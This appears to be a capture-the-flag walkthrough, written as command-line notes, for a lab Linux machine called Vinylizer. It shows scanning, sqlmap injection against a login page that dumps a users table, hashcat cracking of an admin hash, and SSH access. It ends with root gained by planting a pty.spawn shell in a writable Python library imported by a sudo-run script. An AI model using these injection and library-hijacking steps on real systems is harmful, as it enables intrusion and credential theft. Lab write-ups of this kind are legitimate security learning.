@@ -1,1 +1,376 @@
-          ENUMERATION
+          				ENUMERATION
+
+
+---ifconfig---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig                                 
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 19285  bytes 23840847 (22.7 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1551  bytes 95824 (93.5 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover---
+
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts               
+                                                                               
+ 24 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1440             
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      6     360  Unknown vendor              
+ 10.0.2.2        52:54:00:12:35:00      6     360  Unknown vendor              
+ 10.0.2.3        08:00:27:71:5f:60      6     360  PCS Systemtechnik GmbH      
+ 10.0.2.36       08:00:27:6d:ec:17      6     360  PCS Systemtechnik GmbH      
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                                                       
+
+
+
+---nmap---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.36 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 15:26 +03
+Nmap scan report for 10.0.2.36
+Host is up (0.00078s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f8:e3:79:35:12:8b:e7:41:d4:27:9d:97:a5:14:b6:16 (ECDSA)
+|_  256 e3:8b:15:12:6b:ff:97:57:82:e5:20:58:2d:cb:55:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Vinyl Records Marketplace
+MAC Address: 08:00:27:6D:EC:17 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.78 ms 10.0.2.36
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.68 seconds
+                             
+
+
+---we see that there are open http and ssh ports, once we get a hold of user credentials we can continue with ssh---
+
+
+---I run web enum with dirb, nikto, gobuster and not much comes up but I see that the website uses mysql, I also do some manuel enumeration---
+
+
+---there is a login page in the website, lets go from there and run sql injections---
+
+
+                                                                                                                                   
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/VINYLIZER LINUX CTF]
+└─# sqlmap -u "http://10.0.2.36/login.php" --current-db --forms --crawl=2
+        ___
+       _H_
+ ___ __["]____ ___ ___  {1.8.3#stable}
+|_ -| . [,]     | .'| . |
+||  [)]|||_,|  _|
+      ||V...       ||   https://sqlmap.org
+
+
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:43:26 /2024-04-08/
+
+current database: 'vinyl_marketplace'
+[15:46:18] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 48 times
+[15:46:18] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04082024_0343pm.csv'
+
+[*] ending @ 15:46:18 /2024-04-08/
+
+
+
+---we learn that current database is vinyl_marketplace, lets look at its tables---
+
+                                                                                                                                   
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/VINYLIZER LINUX CTF]
+└─# sqlmap -u "http://10.0.2.36/login.php" -D vinyl_marketplace --tables --forms --crawl=2
+
+        ___
+       _H_
+ ___ __[)]____ ___ ___  {1.8.3#stable}
+|_ -| . [(]     | .'| . |
+||  [']|||_,|  _|
+      ||V...       ||   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:49:43 /2024-04-08/
+
+[15:50:07] [INFO] retrieved: 
+[15:50:18] [INFO] adjusting time delay to 1 second due to good response times
+users
+Database: vinyl_marketplace
+[1 table]
++-------+
+| users |
++-------+
+
+[15:50:31] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04082024_0349pm.csv'
+
+[*] ending @ 15:50:31 /2024-04-08/
+
+           
+
+
+
+---turns out there is only one table, users, we can check it's columns or dump all the info from the table---
+
+
+---optional, we check the columns too---
+
+                                                                                                                                  
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/VINYLIZER LINUX CTF]
+└─# sqlmap -u "http://10.0.2.36/login.php" -D vinyl_marketplace -T users --columns --forms --crawl=2 
+
+        ___
+       _H_
+ ___ __[,]____ ___ ___  {1.8.3#stable}
+|_ -| . [)]     | .'| . |
+||  [)]|||_,|  _|
+      ||V...       ||   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:51:18 /2024-04-08/
+
+Database: vinyl_marketplace
+Table: users
+[4 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| id             | int          |
+| login_attempts | int          |
+| password       | varchar(255) |
+| username       | varchar(255) |
++----------------+--------------+
+
+[15:55:13] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04082024_0351pm.csv'
+
+[*] ending @ 15:55:13 /2024-04-08/
+
+
+
+
+
+---lets dump all the info from the table---
+
+                                                                                                                                   
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/VINYLIZER LINUX CTF]
+└─# sqlmap -u "http://10.0.2.36/login.php" -D vinyl_marketplace -T users --dump-all  --forms --crawl=2
+
+        ___
+       _H_
+ ___ __[,]____ ___ ___  {1.8.3#stable}
+|_ -| . [(]     | .'| . |
+||  [']|||_,|  _|
+      ||V...       ||   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:55:56 /2024-04-08/
+                                                                                  
+Database: vinyl_marketplace
+Table: users
+[2 entries]
++----+----------------------------------+-----------+----------------+
+| id | password                         | username  | login_attempts |
++----+----------------------------------+-----------+----------------+
+| 1  | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0              |
+| 2  | password123                      | lana      | 0              |
++----+----------------------------------+-----------+----------------+
+
+[16:01:51] [INFO] table 'vinyl_marketplace.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.0.2.36/dump/vinyl_marketplace/users.csv'
+[16:01:51] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04082024_0356pm.csv'
+
+[*] ending @ 16:01:51 /2024-04-08/
+
+
+
+---now we have some user credentials, we got a hash value for the admin and plaintext password for lana---
+
+---the password for lana didnt get me anywhere in ssh or the website, lets crack the admins password with hashcat to see if its any use---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/VINYLIZER LINUX CTF]
+└─# hashcat -a 0 -m 0 "9432522ed1a8fca612b11c3980a031f6" /home/okina/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+
+Dictionary cache hit:
+* Filename..: /home/okina/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+9432522ed1a8fca612b11c3980a031f6:addicted2vinyl           
+  
+
+
+
+				GAINING FOOTHOLD
+
+
+---now we have the password for shopadmin also, lets use it---
+
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/VINYLIZER LINUX CTF]
+└─# ssh shopadmin@10.0.2.36 
+shopadmin@10.0.2.36's password: 
+Permission denied, please try again. //made a typo :)
+shopadmin@10.0.2.36's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+shopadmin@vinylizer:~$ ls
+user.txt
+shopadmin@vinylizer:~$ cat user.txt 
+---First User Flag---
+
+
+shopadmin@vinylizer:~$ whoami
+shopadmin
+shopadmin@vinylizer:~$ cd ..
+shopadmin@vinylizer:/home$ ls
+mrmidnight  shopadmin
+shopadmin@vinylizer:/home$ cd mrmidnight/
+-bash: cd: mrmidnight/: Permission denied
+
+
+
+---lets check sudo -l and /etc/crontab--- 
+
+shopadmin@vinylizer:/home$ sudo -l
+Matching Defaults entries for shopadmin on vinylizer:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User shopadmin may run the following commands on vinylizer:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py
+
+
+shopadmin@vinylizer:/home$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+
+---from sudo -l we see that this user can run /usr/bin/python3 /opt/vinylizer.py as root without the need of a password---
+
+---I check gtfobins to find the proper priv esc---
+
+---I run the python command that I find in the website but it is no use, lets look for some other alternatives---
+
+
+
+
+
+					PRIV ESCALATION
+
+
+---We can check for files that we the permission to write on by using---
+
+shopadmin@vinylizer:~$ find / -type f -writable 2>/dev/null
+
+
+---when we write this we see lots of files but one of them picks our interest because it is familiar with the file that we can run without becoming root user---
+
+/usr/lib/python3.10/random.py
+
+
+---Now we know that we can edit this file, we can put in /bin/bash -p command in it to become root---
+
+ 
+shopadmin@vinylizer:~$ nano /usr/lib/python3.10/random.py
+
+import pty
+pty.spawn("/bin/bash")
+"""Random variable generators.
+
+    bytes
+    -----
+           uniform bytes (values between 0 and 255)
+
+    integers
+    --------
+           uniform within range
+
+    sequences
+    ---------
+	...................
+	...................
+
+
+
+---now lets run the vinylizer.py--- 
+
+shopadmin@vinylizer:~$ sudo /usr/bin/python3 /opt/vinylizer.py
+root@vinylizer:/home/shopadmin# whoami
+root
+
+
+
+---boom, we are root, lets get the flag---
+
+
+
+root@vinylizer:/home/shopadmin# cd /root
+root@vinylizer:~# ls
+root.txt  snap
+root@vinylizer:~# cat root.txt 
+---Root User Flag---
+
